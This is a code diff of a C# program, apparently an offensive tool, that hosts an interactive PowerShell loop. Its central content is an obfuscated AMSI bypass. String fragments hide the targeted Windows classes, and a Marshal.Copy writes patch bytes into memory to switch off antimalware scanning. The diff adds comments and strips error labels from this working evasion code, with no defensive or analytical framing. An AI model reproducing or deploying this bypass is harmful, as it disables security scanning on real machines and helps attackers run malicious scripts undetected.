@@ -53,7 +53,7 @@
 
                 Console.WriteLine("PS " + y2 + ">");
 
-                // Obfuscated AMSI bypass
+                // Obfuscated AMSI bypass (PowerShell, no ETW)
                 string amsiBypass = @"
                     $x1 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
                     $y2 = $x1.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
@@ -79,7 +79,8 @@
                     Start-Sleep 1
                     [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $u6, 12)
                 ";
-        
+
+                // Execute AMSI bypass
                 try
                 {
                     y1.AddScript(amsiBypass);
@@ -89,7 +90,7 @@
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine("ERROR: Failed to apply AMSI bypass: " + e.Message);
+                    Console.WriteLine(e.Message);
                     x2.Close();
                     return;
                 }
@@ -104,11 +105,12 @@
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine("ERROR: Failed to set execution policy: " + e.Message);
+                    Console.WriteLine(e.Message);
                     x2.Close();
                     return;
                 }
 
+                // Interactive PowerShell loop
                 while (true)
                 {
                     Console.Write("PS " + y2 + "> ");
@@ -153,7 +155,7 @@
                             Console.WriteLine();
                             foreach (ErrorRecord error in errors)
                             {
-                                Console.WriteLine("ERROR: " + error.ToString());
+                                Console.WriteLine(error.ToString());
                             }
                         }
 
@@ -173,7 +175,6 @@
                     catch (Exception e)
                     {
                         Console.WriteLine();
-                        Console.WriteLine("**** ERROR ****");
                         Console.WriteLine(e.Message);
                     }
                     finally
